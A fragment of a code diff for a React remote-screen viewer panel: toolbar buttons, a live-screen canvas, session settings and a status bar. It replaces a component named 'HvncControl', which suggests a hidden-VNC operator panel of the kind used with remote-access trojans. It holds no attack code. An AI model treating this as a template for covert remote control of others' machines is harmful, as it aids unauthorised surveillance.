+              <SelectItem value="medium" className="text-slate-200">Medium</SelectItem>
+              <SelectItem value="low" className="text-slate-200">Low</SelectItem>
+            </SelectContent>
+          </Select>
+
+          <Button
+            size="sm"
+            variant="ghost"
+            onClick={takeScreenshot}
+            className="h-8 px-2 hover:bg-slate-700/50"
+            title="Screenshot"
+          >
+            <Camera className="h-4 w-4 text-slate-300" />
+          </Button>
+
+          <Button
+            size="sm"
+            variant="ghost"
+            onClick={toggleFullscreen}
+            className="h-8 px-2 hover:bg-slate-700/50"
+            title="Fullscreen"
+          >
+            <Maximize2 className="h-4 w-4 text-slate-300" />
+          </Button>
+
+          <Button
+            size="sm"
+            variant="ghost"
+            onClick={() => setShowSettings(!showSettings)}
+            className="h-8 px-2 hover:bg-slate-700/50"
+            title="Settings"
+          >
+            <Settings className="h-4 w-4 text-slate-300" />
+          </Button>
+
+          <div className="w-px h-6 bg-slate-600 mx-1" />
+
+          <Button
+            size="sm"
+            variant="ghost"
+            onClick={handleDisconnect}
+            className="h-8 px-2 hover:bg-red-500/20 text-red-400 hover:text-red-300"
+            title="Disconnect"
+          >
+            <Power className="h-4 w-4" />
+          </Button>
+
+          <Button
+            size="sm"
+            variant="ghost"
+            onClick={onClose}
+            className="h-8 px-2 hover:bg-slate-700/50"
+            title="Close"
+          >
+            <X className="h-4 w-4 text-slate-300" />
+          </Button>
+        </div>
+      </div>
+
+      {/* Main Screen Area */}
+      <div className="flex-1 flex items-center justify-center p-4 overflow-auto" style={{
+        background: `linear-gradient(135deg, ${colors.bgGradientFrom}, ${colors.bgGradientTo})`
+      }}>
+        {!isConnected ? (
+          <div className="text-center">
+            <div className="mb-4 relative">
+              <div className="w-16 h-16 mx-auto rounded-full animate-spin" style={{
+                background: `linear-gradient(to right, ${colors.primary}, transparent)`,
+                border: `2px solid ${colors.border}`
+              }} />
+              <Monitor className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 h-8 w-8" style={{
+                color: colors.primary
+              }} />
             </div>
-            <div>
-              <label className="block text-sm text-bodydark2 mb-1">Quality Settings</label>
-              <select 
-                className="w-full bg-bodydark2/10 border border-stroke rounded p-2"
-                value={quality}
-                onChange={(e) => setQuality(e.target.value)}
+            <p className="text-slate-300 mb-1">Establishing Connection</p>
+            <p className="text-xs text-slate-500">Connecting to {agentId}</p>
+          </div>
+        ) : (
+          <div className="relative w-full h-full flex items-center justify-center">
+            <canvas
+              ref={canvasRef}
+              className="max-w-full max-h-full rounded-lg shadow-2xl cursor-crosshair"
+              style={{
+                border: `1px solid ${colors.border}`,
+                boxShadow: `0 20px 60px ${colors.glowColor}`
+              }}
+            />
+          </div>
+        )}
+      </div>
+
+      {/* Settings Panel (Slide-in) */}
+      {showSettings && (
+        <div className="absolute right-0 top-14 bottom-0 w-80 backdrop-blur-xl border-l overflow-auto z-50 animate-in slide-in-from-right duration-300"
+          style={{
+            background: `linear-gradient(to bottom, ${colors.cardGradientFrom}f5, ${colors.cardGradientTo}f5)`,
+            borderColor: colors.border
+          }}>
+          <div className="p-4 space-y-4">
+            <div className="flex items-center justify-between mb-4">
+              <h4 className="text-slate-200">Settings</h4>
+              <Button
+                size="sm"
+                variant="ghost"
+                onClick={() => setShowSettings(false)}
+                className="h-7 w-7 p-0"
               >
-                <option value="high">High Quality (More Bandwidth)</option>
-                <option value="medium">Medium Quality (Balanced)</option>
-                <option value="low">Low Quality (Less Bandwidth)</option>
-              </select>
+                <X className="h-4 w-4" />
+              </Button>
             </div>
-            <button 
-              className="w-full py-2 px-4 bg-primary text-white rounded-lg"
-              onClick={connectHvnc}
-              disabled={isLoading}
-            >
-              {isLoading ? (
-                <div className="flex items-center justify-center">
-                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
-                  Connecting...
+
+            <div className="space-y-3">
+              <div>
+                <label className="text-xs text-slate-400 mb-2 block">Session ID</label>
+                <div className="flex items-center gap-2">
+                  <input
+                    type="text"
+                    value={sessionId}
+                    readOnly
+                    className="flex-1 px-3 py-2 text-xs rounded-lg border bg-slate-900/50 text-slate-300 border-slate-600"
+                  />
+                  <Button
+                    size="sm"
+                    variant="ghost"
+                    onClick={() => navigator.clipboard.writeText(sessionId)}
+                    className="h-8 w-8 p-0"
+                  >
+                    <Copy className="h-3 w-3" />
+                  </Button>
                 </div>
-              ) : (
-                'Connect'
-              )}
-            </button>
+              </div>
+
+              <div>
+                <label className="text-xs text-slate-400 mb-2 block">Resolution</label>
+                <div className="px-3 py-2 text-xs rounded-lg border bg-slate-900/50 text-slate-300 border-slate-600">
+                  {screenInfo.width} × {screenInfo.height}
+                </div>
+              </div>
+
+              <div>
+                <label className="text-xs text-slate-400 mb-2 block">FPS: {fps}</label>
+                <input
+                  type="range"
+                  min="10"
+                  max="60"
+                  value={fps}
+                  onChange={(e) => setFps(Number(e.target.value))}
+                  className="w-full"
+                  style={{
+                    accentColor: colors.primary
+                  }}
+                />
+              </div>
+
+              <div className="pt-3 border-t" style={{ borderColor: colors.border }}>
+                <Button
+                  onClick={takeScreenshot}
+                  className="w-full text-white"
+                  style={{
+                    background: `linear-gradient(to right, ${colors.primary}, ${colors.primaryDark})`
+                  }}
+                >
+                  <Download className="h-4 w-4 mr-2" />
+                  Download Screenshot
+                </Button>
+              </div>
+            </div>
           </div>
         </div>
       )}
+
+      {/* Footer Status Bar */}
+      <div className="flex items-center justify-between px-4 py-1.5 text-xs border-t" style={{
+        background: colors.cardGradientFrom,
+        borderColor: colors.border
+      }}>
+        <div className="flex items-center gap-4 text-slate-400">
+          <span>Resolution: {screenInfo.width} × {screenInfo.height}</span>
+          <span>•</span>
+          <span>FPS: {fps}</span>
+          <span>•</span>
+          <span>Session: {sessionId.slice(0, 12)}...</span>
+        </div>
+        <div className="flex items-center gap-2">
+          <Button
+            size="sm"
+            variant="ghost"
+            onClick={takeScreenshot}
+            className="h-6 px-2 text-xs hover:bg-slate-700/50"
+            style={{ color: colors.primary }}
+          >
+            <Download className="h-3 w-3 mr-1" />
+            Sync Clipboard
+          </Button>
+        </div>
+      </div>
     </div>
   );
-};
-
-export default HvncControl;
+}
